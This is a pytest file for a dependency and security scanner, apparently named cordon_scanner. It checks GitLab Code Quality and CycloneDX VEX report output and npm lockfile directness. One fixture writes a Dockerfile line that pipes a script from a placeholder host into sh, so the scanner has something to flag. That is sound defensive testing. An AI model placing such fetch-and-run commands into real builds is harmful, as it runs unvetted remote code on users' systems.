"""The two formats a report has to be in to be read by somebody else's tooling.

Code Quality is the only report GitLab renders inline on every plan, and VEX is
the only way to tell a downstream consumer that a vulnerability in the SBOM does
not apply. Both are consumed by machines that will not tolerate a missing field,
so the tests here are about the shape as much as the content.
"""

from __future__ import annotations

import json

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config
from cordon_scanner.core.registry import Registry


def render(result, fmt: str) -> object:
    reporter = Registry().reporter(fmt)
    from cordon_scanner.report.base import ReportOptions

    body = b"".join(reporter.render(result, ReportOptions()))
    return json.loads(body)


@pytest.fixture
def scanned(tmp_path):
    (tmp_path / "package-lock.json").write_text(
        '{"name":"d","lockfileVersion":3,"packages":{'
        '"":{"name":"d","dependencies":{"minimist":"1.2.0"}},'
        '"node_modules/minimist":{"version":"1.2.0"}}}',
        encoding="utf-8",
    )
    return Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)


class TestCodeQuality:
    def test_every_entry_carries_what_gitlab_requires(self, scanned) -> None:
        """GitLab drops an entry missing any of these rather than showing it."""
        entries = render(scanned, "codeclimate")
        assert entries
        for entry in entries:
            assert entry["type"] == "issue"
            assert entry["check_name"]
            assert entry["description"]
            assert entry["fingerprint"]
            assert entry["location"]["path"]
            assert entry["location"]["lines"]["begin"] >= 1

    def test_the_severity_vocabulary_is_code_climates(self, scanned) -> None:
        allowed = {"info", "minor", "major", "critical", "blocker"}
        assert {entry["severity"] for entry in render(scanned, "codeclimate")} <= allowed

    def test_the_fingerprint_is_the_one_the_finding_carries(self, scanned) -> None:
        """An unstable fingerprint makes every finding look new on every run."""
        rendered = {entry["fingerprint"] for entry in render(scanned, "codeclimate")}
        assert rendered <= {f.fingerprint for f in scanned.findings}

    def test_operational_notes_are_not_findings_about_the_code(self, scanned) -> None:
        names = {entry["check_name"] for entry in render(scanned, "codeclimate")}
        assert not [name for name in names if name.startswith("OPERATIONAL.")]


class TestVex:
    def test_it_is_a_cyclonedx_document(self, scanned) -> None:
        document = render(scanned, "vex")
        assert document["bomFormat"] == "CycloneDX"
        assert document["specVersion"] == "1.5"
        assert document["vulnerabilities"]

    def test_a_statement_names_the_advisory_and_the_component(self, scanned) -> None:
        for statement in render(scanned, "vex")["vulnerabilities"]:
            assert statement["id"]
            assert statement["affects"][0]["ref"].startswith("pkg:")
            assert statement["analysis"]["state"] in {"exploitable", "not_affected"}

    def test_without_reachability_nothing_is_ruled_out(self, scanned) -> None:
        """`not_affected` is a claim. It is only made when something was checked."""
        states = {s["analysis"]["state"] for s in render(scanned, "vex")["vulnerabilities"]}
        assert states == {"exploitable"}

    def test_an_unimported_transitive_dependency_is_not_affected(self, tmp_path) -> None:
        (tmp_path / "package-lock.json").write_text(
            '{"name":"d","lockfileVersion":3,"packages":{'
            '"":{"name":"d","dependencies":{"express":"4.18.2"}},'
            '"node_modules/express":{"version":"4.18.2"},'
            '"node_modules/minimist":{"version":"1.2.0"}}}',
            encoding="utf-8",
        )
        (tmp_path / "app.js").write_text('const express = require("express");\n', encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False, reachability=True)).scan(
            tmp_path
        )
        statements = render(result, "vex")["vulnerabilities"]
        assert statements
        for statement in statements:
            assert statement["affects"][0]["ref"].startswith("pkg:npm/minimist")
            assert statement["analysis"]["state"] == "not_affected"
            assert statement["analysis"]["justification"] == "code_not_reachable"

    def test_only_vulnerabilities_become_statements(self, tmp_path) -> None:
        """A VEX statement is about a known vulnerability in a component. A
        behavioural finding is neither, and a consumer's tooling cannot act on
        one."""
        (tmp_path / "Dockerfile").write_text(
            "FROM debian:12\nRUN curl https://x.invalid/i.sh | sh\n", encoding="utf-8"
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        assert result.findings
        assert render(result, "vex")["vulnerabilities"] == []


class TestNpmDirectness:
    """Reachability only lowers a transitive finding, so which entries are
    direct decides whether it can ever lower anything."""

    def test_the_root_entry_decides(self, tmp_path) -> None:
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.core.limits import Limits
        from cordon_scanner.ecosystems.npm import NpmEcosystem

        text = (
            '{"name":"d","lockfileVersion":3,"packages":{'
            '"":{"name":"d","dependencies":{"express":"4.18.2"}},'
            '"node_modules/express":{"version":"4.18.2"},'
            '"node_modules/minimist":{"version":"1.2.0"}}}'
        )
        graph = NpmEcosystem().parse_lockfile(
            FileContent.from_bytes("package-lock.json", text.encode(), Limits())
        )
        direct = {entry.name: entry.direct for entry in graph.entries}
        assert direct == {"express": True, "minimist": False}

    def test_a_lockfile_with_no_root_lists_falls_back_to_depth(self, tmp_path) -> None:
        """A partial lockfile states nothing about what the project asked for,
        and the hoisting heuristic is all the format supports."""
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.core.limits import Limits
        from cordon_scanner.ecosystems.npm import NpmEcosystem

        text = (
            '{"name":"d","lockfileVersion":3,"packages":{'
            '"node_modules/express":{"version":"4.18.2"},'
            '"node_modules/express/node_modules/ms":{"version":"2.0.0"}}}'
        )
        graph = NpmEcosystem().parse_lockfile(
            FileContent.from_bytes("package-lock.json", text.encode(), Limits())
        )
        direct = {entry.name: entry.direct for entry in graph.entries}
        assert direct == {"express": True, "ms": False}
